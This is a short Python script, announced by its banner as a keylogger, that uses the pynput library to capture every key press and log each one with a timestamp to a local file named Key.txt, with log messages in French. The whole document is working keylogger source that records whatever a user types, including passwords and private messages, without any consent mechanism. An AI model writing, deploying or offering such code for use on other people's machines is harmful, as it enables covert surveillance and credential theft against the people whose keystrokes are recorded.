from pynput.keyboard import Key, Listener
import logging

print("----------------------------------|welcome to Keylogger|----------------------------------")
logging.basicConfig(filename='Key.txt', level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.debug(f"la touche {key} est pressée")
    except AttributeError:
        logging.debug(f"la touche spécial {key} est pressée")

with Listener(on_press=on_press) as l:
    l.join()